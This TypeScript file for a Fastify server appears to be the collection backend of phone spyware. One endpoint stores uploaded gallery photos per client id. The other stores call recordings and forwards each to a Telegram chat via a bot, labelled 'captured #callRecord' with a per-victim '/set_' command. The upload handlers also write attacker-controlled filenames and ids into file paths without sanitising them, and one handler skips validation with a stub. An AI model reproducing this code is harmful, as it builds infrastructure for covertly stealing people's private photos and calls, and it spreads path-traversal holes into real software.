import { fastify as fast } from "fastify";
import { fileTypeFromBuffer } from "file-type";
import { classify } from "../database/dbs";
import { getJalaliTime, createFont } from "../utilities";
import { scarlett } from "./declaration";
import { InputFile } from "grammy";
import multipart from "@fastify/multipart";
import fastifyMongoSanitize from "@exortek/fastify-mongo-sanitize";
import fastifyRateLimit from "@fastify/rate-limit";
import fs from "fs";
import path from "path";

const UPLOAD_FOLDER_GALLERY = path.join(__dirname, "..", ".gallery");
const UPLOAD_FOLDER_CALL = path.join(__dirname, "..", ".calls");

const ALLOWED_EXTENSIONS_PHOTO = [ 'jpg', 'jpeg', 'png' ];
const ALLOWED_EXTENSIONS_AUDIO = [ 'mp3', 'wav', 'ogg', 'm4a', 'aac', 'flac' ];

const allowedPhotoMimes = [ 'image/png', 'image/jpeg' ];
const allowedAudioMimes = [ 'audio/mpeg', 'audio/wav', 'audio/ogg', 'audio/mp4', 'audio/aac', 'audio/flac' ];

const fastify = fast({
    logger: false
});

fastify.register(fastifyMongoSanitize);
fastify.register(fastifyRateLimit, {
    max: 150000,
    timeWindow: '1 minute',
    hook: 'onRequest'
});

fastify.register(multipart, {
    limits: {
        fileSize: 1024 * 1024 * 100,
        files: 1,
        headerPairs: 8000
    }
});

fastify.setErrorHandler((error, request, reply) => {
    request.log.error({ err: error instanceof Error ? error.message : error });
    console.log(error);
    reply.code(500).send({
        status: false,
        message: "internal server error",
        err: error instanceof Error ? error.message : error
    });
});

if (!fs.existsSync(UPLOAD_FOLDER_GALLERY)){
    fs.mkdirSync(UPLOAD_FOLDER_GALLERY, { recursive: true });
}

if (!fs.existsSync(UPLOAD_FOLDER_CALL)){
    fs.mkdirSync(UPLOAD_FOLDER_CALL, { recursive: true });
}

function allowed_file_photo(name: string){
    return ALLOWED_EXTENSIONS_PHOTO.includes((name.split(".").length > 0 ? name.split(".") : [""]).pop()!.toLowerCase());
}

function allowed_file_audio(name: string){
    return ALLOWED_EXTENSIONS_AUDIO.includes((name.split(".").length > 0 ? name.split(".") : [""]).pop()!.toLowerCase());
}

fastify.post("/g", async (request, reply) => {
    const ip = request.ip;
    const blocked_ip = await classify.ipblocker.getIP(ip);

    if (blocked_ip !== null) {
        return reply.code(400).send({ status: false, message: "you have been blocked" });
    }

    const parts = request.parts();
    const other_data: Record<string, string> = {};
    let uploadedFile: any = null;
    let fileBuffer: Buffer | null = null;

    for await (const part of parts) {
        if (part.type === "file") {
            uploadedFile = part;
            fileBuffer = await part.toBuffer();
        } else {
            other_data[part.fieldname] = (part.value as string) ?? "";
        }
    }

    console.log("other data", other_data);

    const { error } = { error: false } as { error: any };

    if (error) {
        return reply.code(400).send({ status: false, message: "invalid input (for other part of body)" });
    }

    if (!other_data.id) {
        return reply.code(400).send({ status: false, message: "invalid parts" });
    } else if (typeof other_data.id !== "string") {
        return reply.code(400).send({ status: false, message: "invalid parts type" });
    }

    if (!other_data.from_port) {
        return reply.code(400).send({ status: false, message: "invalid parts" });
    } else if (typeof other_data.from_port !== "string") {
        return reply.code(400).send({ status: false, message: "invalid parts type" });
    }

    const port = await classify.portService.getPort(other_data.from_port);
    console.log("port", port);

    if (!port){
        return reply.code(400).send({ status: false, message: "invalid committion" });
    }

    const client = await classify.ceph.getClientById(other_data.id);
    console.log("client", client);

    if (!client) {
        return reply.code(400).send({ status: false, message: "invalid client id" });
    }

    if (client.blocked) {
        return reply.code(400).send({ status: false, message: "you have been blocked" });
    }

    console.log("uploaded file | file buffer", uploadedFile, fileBuffer);

    if (!uploadedFile || !fileBuffer) {
        return reply.code(400).send({ status: false, message: "no file inputted" });
    }

    const filename = uploadedFile.filename;
    console.log("filename", filename);

    if (!filename) {
        return reply.code(400).send({ status: false, message: "bad upload request" });
    }

    const user_path = path.join(UPLOAD_FOLDER_GALLERY, other_data.id);
    console.log("user path", user_path);

    if (!(fs.existsSync(user_path))){
        fs.mkdirSync(user_path, { recursive: true });
    }

    const filepath = path.join(user_path, filename);

    const fileType = await fileTypeFromBuffer(fileBuffer);
    if (fileType) {
        if (!(allowedPhotoMimes.includes(fileType.mime))) {
            return reply.code(400).send({ status: false, message: "invalid mime type" });
        }
    } else {
        return reply.code(400).send({ status: false, message: "cannot get the mime type of uploaded file" });
    }

    try {
        fs.writeFileSync(filepath, fileBuffer);
    } catch (e) {
        return reply.code(400).send({ status: false, message: "cannot write file" });
    }

    const stats = fs.statSync(filepath);
    const filesizemb = stats.size / (1024 * 1024);

    if (filesizemb > 100) {
        fs.unlinkSync(filepath);
        return reply.code(400).send({ status: false, message: "invalid file size" });
    }

    return reply.send({ status: true });
});

fastify.post("/c", async (request, reply) => {
    const ip = request.ip;
    const blocked_ip = await classify.ipblocker.getIP(ip);

    if (blocked_ip !== null) {
        return reply.code(400).send({ status: false, message: "you have been blocked" });
    }

    const parts = request.parts();
    const other_data: Record<string, string> = {};
    let uploadedFile: any = null;
    let fileBuffer: Buffer | null = null;

    for await (const part of parts) {
        if (part.type === "file") {
            uploadedFile = part;
            fileBuffer = await part.toBuffer();
        } else {
            other_data[part.fieldname] = (part.value as string) ?? "";
        }
    }

    const { error } = classify.schemas.createUploadSchema().validate(other_data);

    if (error) {
        return reply.code(400).send({ status: false, message: "invalid input (for other part of body)" });
    }

    if (!other_data.id) {
        return reply.code(400).send({ status: false, message: "invalid parts" });
    } else if (typeof other_data.id !== "string") {
        return reply.code(400).send({ status: false, message: "invalid parts type" });
    }

    if (!other_data.from_port) {
        return reply.code(400).send({ status: false, message: "invalid parts" });
    } else if (typeof other_data.from_port !== "string") {
        return reply.code(400).send({ status: false, message: "invalid parts type" });
    }

    const port = await classify.portService.getPort(other_data.from_port);

    if (!port){
        return reply.code(400).send({ status: false, message: "invalid committion" });
    }

    const client = await classify.ceph.getClientById(other_data.id);
    if (!client) {
        return reply.code(400).send({ status: false, message: "invalid client id" });
    }

    if (client.blocked) {
        return reply.code(400).send({ status: false, message: "you have been blocked" });
    }

    if (!uploadedFile || !fileBuffer) {
        return reply.code(400).send({ status: false, message: "no file inputted" });
    }

    const filename = uploadedFile.filename;

    if (!filename) {
        return reply.code(400).send({ status: false, message: "bad upload request" });
    }

    if (!allowed_file_audio(filename)) {
        return reply.code(400).send({ status: false, message: "file extension has not supported" });
    }

    const user_path = path.join(UPLOAD_FOLDER_CALL, other_data.id);

    if (!(fs.existsSync(user_path))){
        fs.mkdirSync(user_path, { recursive: true });
    }

    const filepath = path.join(user_path, filename);

    const fileType = await fileTypeFromBuffer(fileBuffer);
    if (fileType) {
        if (!allowedAudioMimes.includes(fileType.mime)) {
            return reply.code(400).send({ status: false, message: "invalid mime type" });
        }
    } else {
        return reply.code(400).send({ status: false, message: "cannot get the mime type of uploaded file" });
    }

    try {
        fs.writeFileSync(filepath, fileBuffer);
    } catch (e) {
        return reply.code(400).send({ status: false, message: "cannot write file" });
    }

    const stats = fs.statSync(filepath);
    const filesizemb = stats.size / (1024 * 1024);

    if (filesizemb > 300) {
        fs.unlinkSync(filepath);
        return reply.code(400).send({ status: false, message: "invalid file size" });
    }

    reply.send({ status: true });

    await scarlett.api.sendVoice(
        port.stores_to,
        new InputFile(filepath),
        { caption: (createFont( `?? | captured #callRecord\n? | ${getJalaliTime()}\n?? | `) + '/set_' + other_data.id + createFont("\n\n?? | call recorded")) }
    );
});

(async () => {
    try {
        await fastify.listen({ port: 3000, host: "0.0.0.0" });
    } catch (e) {
        fastify.log.error(e);
        process.exit(1);
    }
})();